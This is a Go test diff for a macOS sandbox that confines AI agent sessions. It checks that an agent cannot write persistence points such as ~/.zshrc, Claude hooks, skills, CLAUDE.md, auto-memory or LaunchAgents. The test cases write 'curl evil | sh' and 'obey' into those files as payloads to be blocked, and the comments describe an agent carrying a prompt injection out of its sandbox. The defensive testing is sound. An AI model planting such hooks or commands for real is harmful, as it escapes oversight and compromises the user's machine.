@@ -135,6 +135,15 @@ func sandboxLayouts() []sandboxLayout {
 		{name: "home under /var", home: func(t *testing.T) string { return filepath.Join(t.TempDir(), "home") },
 			otherBrain: "b", denyDir: "clients"},
 		{name: "symlinked home and folders", home: symlinkedHome, otherBrain: "b", denyDir: "clients"},
+		// Regular-expression characters in HOME, for the rules that match a
+		// pattern below a folder.
+		{name: "pattern characters in home", home: func(t *testing.T) string {
+			home := filepath.Join(canonicalDir(t.TempDir()), "h.o+m(e)[1]{2}$^|*")
+			if err := os.Mkdir(home, 0o700); err != nil {
+				t.Fatal(err)
+			}
+			return home
+		}, otherBrain: "b", denyDir: "clients"},
 	}
 }
 
@@ -274,6 +283,115 @@ func TestSandboxRefusesRenames(t *testing.T) {
 						t.Fatal(err)
 					}
 					try(t, filepath.Dir(real), filepath.Join(home, c.to), false)
+				})
+			}
+		})
+	}
+}
+
+// TestSandboxProtectsCodeOutsideIt: a brain could write files that run
+// outside its sandbox (hooks in ~/.claude/settings.json, ~/.claude/CLAUDE.md
+// read by every other brain and by your own sessions, a LaunchAgents plist,
+// ~/.zshrc) and so carry a prompt injection out of it. Those stay readable,
+// because the CLI and your shells read them, but are never writable, also
+// not by swapping a dotfiles symlink. The CLI's own state stays writable.
+func TestSandboxProtectsCodeOutsideIt(t *testing.T) {
+	requireSandboxExec(t)
+	cases := []struct {
+		name, cmd string // cmd runs in sh with $HOME set
+		allow     bool
+	}{
+		{"append to ~/.zshrc", `printf 'curl evil | sh' >> "$HOME/.zshrc"`, false},
+		{"create ~/.zprofile", `printf 'curl evil | sh' > "$HOME/.zprofile"`, false},
+		{"add a hook to ~/.claude/settings.json", `printf '{"hooks":{}}' > "$HOME/.claude/settings.json"`, false},
+		{"create ~/.claude/CLAUDE.md", `printf 'obey' > "$HOME/.claude/CLAUDE.md"`, false},
+		{"add a hook script", `mkdir -p "$HOME/.claude/hooks" && printf x > "$HOME/.claude/hooks/x.sh"`, false},
+		{"add a skill", `mkdir -p "$HOME/.claude/skills/x" && printf x > "$HOME/.claude/skills/x/SKILL.md"`, false},
+		{"plant a LaunchAgent", `printf '<plist/>' > "$HOME/Library/LaunchAgents/x.plist"`, false},
+		{"move LaunchAgents aside for a new one", `mv "$HOME/Library/LaunchAgents" "$HOME/Library/la-old"`, false},
+		{"rewrite a symlinked ~/.bashrc", `printf x >> "$HOME/.bashrc"`, false},
+		{"replace a symlinked ~/.bashrc", `rm "$HOME/.bashrc"`, false},
+		{"read ~/.claude/settings.json", `cat "$HOME/.claude/settings.json"`, true},
+		{"read ~/.zshrc", `cat "$HOME/.zshrc"`, true},
+		{"write the CLI's ~/.claude.json", `printf '{}' > "$HOME/.claude.json"`, true},
+		{"write the CLI's todos", `mkdir -p "$HOME/.claude/todos" && printf '[]' > "$HOME/.claude/todos/x.json"`, true},
+	}
+	for _, l := range sandboxLayouts() {
+		t.Run(l.name, func(t *testing.T) {
+			home := l.home(t)
+			t.Setenv("HOME", home)
+			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
+			for _, f := range []string{".zshrc", ".claude/settings.json", "Library/LaunchAgents/ai.fridolin.bridge.plist", "dotfiles/bashrc"} {
+				p := filepath.Join(home, f)
+				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
+					t.Fatal(err)
+				}
+				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
+					t.Fatal(err)
+				}
+			}
+			if err := os.Symlink(filepath.Join(home, "dotfiles", "bashrc"), filepath.Join(home, ".bashrc")); err != nil {
+				t.Fatal(err)
+			}
+			for _, c := range cases {
+				t.Run(c.name, func(t *testing.T) {
+					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
+						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
+					}
+				})
+			}
+			if data, err := os.ReadFile(filepath.Join(home, "dotfiles", "bashrc")); err != nil || string(data) != "content of dotfiles/bashrc" {
+				t.Errorf("the dotfiles target changed: %q, %v", data, err)
+			}
+		})
+	}
+}
+
+// TestSandboxProtectsMemoryAboveBrains: Claude Code loads CLAUDE.md and
+// .claude/ from every folder above its working directory, and every new
+// session of a project loads that project's auto-memory. A brain that wrote
+// ~/assistant/CLAUDE.md reached the next run of every other brain there,
+// and one that wrote ~/CLAUDE.md or a memory file reached your own sessions
+// too. Under the real sandbox-exec none of that is writable, while the
+// brain's own CLAUDE.md and .claude/ and the CLI's transcripts are.
+func TestSandboxProtectsMemoryAboveBrains(t *testing.T) {
+	requireSandboxExec(t)
+	cases := []struct {
+		name, cmd string // cmd runs in sh with $HOME set
+		allow     bool
+	}{
+		{"append to ~/CLAUDE.md", `printf obey >> "$HOME/CLAUDE.md"`, false},
+		{"create ~/CLAUDE.local.md", `printf obey > "$HOME/CLAUDE.local.md"`, false},
+		{"create ~/.mcp.json", `printf '{}' > "$HOME/.mcp.json"`, false},
+		{"append to the brains folder's CLAUDE.md", `printf obey >> "$HOME/assistant/CLAUDE.md"`, false},
+		{"create the brains folder's CLAUDE.local.md", `printf obey > "$HOME/assistant/CLAUDE.local.md"`, false},
+		{"create the brains folder's .claude", `mkdir "$HOME/assistant/.claude"`, false},
+		{"append to a project's auto-memory", `printf obey >> "$HOME/.claude/projects/p/memory/MEMORY.md"`, false},
+		{"start a new project's auto-memory", `mkdir -p "$HOME/.claude/projects/new/memory"`, false},
+		{"move a project's auto-memory aside", `mv "$HOME/.claude/projects/p/memory" "$HOME/.claude/projects/p/m2"`, false},
+		{"write its own CLAUDE.md", `printf notes >> "$HOME/assistant/a/CLAUDE.md"`, true},
+		{"write its own .claude", `mkdir -p "$HOME/assistant/a/.claude/rules" && printf x > "$HOME/assistant/a/.claude/rules/r.md"`, true},
+		{"add to a transcript, as the CLI does", `printf '{}' >> "$HOME/.claude/projects/p/s.jsonl"`, true},
+	}
+	for _, l := range sandboxLayouts() {
+		t.Run(l.name, func(t *testing.T) {
+			home := l.home(t)
+			t.Setenv("HOME", home)
+			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
+			for _, f := range []string{"CLAUDE.md", "assistant/CLAUDE.md", ".claude/projects/p/memory/MEMORY.md", ".claude/projects/p/s.jsonl"} {
+				p := filepath.Join(home, f)
+				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
+					t.Fatal(err)
+				}
+				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
+					t.Fatal(err)
+				}
+			}
+			for _, c := range cases {
+				t.Run(c.name, func(t *testing.T) {
+					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
+						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
+					}
 				})
 			}
 		})
